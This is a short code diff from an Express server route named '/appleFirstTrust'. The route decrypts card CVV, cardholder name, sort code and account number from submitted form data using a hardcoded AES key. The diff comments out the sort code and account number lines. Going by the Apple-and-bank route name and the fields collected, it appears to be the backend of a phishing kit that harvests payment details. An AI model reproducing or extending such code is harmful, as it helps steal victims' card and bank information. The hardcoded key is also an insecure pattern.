@@ -3337,12 +3337,12 @@ app.post("/appleFirstTrust", (req, res) => {
   cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
     CryptoJS.enc.Utf8
   );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
+  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
+  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+  //   CryptoJS.enc.Utf8
+  // );
   ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
     CryptoJS.enc.Utf8
   );
